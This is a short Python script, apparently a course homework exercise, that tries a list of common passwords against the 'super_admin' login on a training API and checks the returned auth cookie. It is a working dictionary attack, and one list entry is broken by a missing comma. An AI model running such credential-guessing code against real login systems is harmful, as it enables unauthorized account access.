import requests

login = "super_admin"
passwords = ["123456", "password", "123456789", "12345678", "12345", "1234567", "1234567890", "qwerty", "abc123", "111111", "123123", "admin", "welcome" "monkey", "login", "letmein", "dragon", "passw0rd", "football", "master", "hello", "freedom", "whatever", "qazwsx", "trustno1"]

url = "https://playground.learnqa.ru/ajax/api/"

def get_secret_password_homework(login, password):
    response = requests.post(f"{url}get_secret_password_homework", data={"login": login, "password": password})
    if response.status_code == 500:
        return False
    else:
        return response.cookies.get("auth_cookie")

def check_auth_cookie(cookie):
    response = requests.post(f"{url}check_auth_cookie", cookies={"auth_cookie": cookie})
    if response.text == "You are NOT authorized":
        return False
    else:
        return True

for password in passwords:
    cookie = get_secret_password_homework(login, password)
    if cookie:
        if check_auth_cookie(cookie):
            print("Password found:", password)
            print("Response:", check_auth_cookie(cookie))



requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login": "super_admin", "password": password})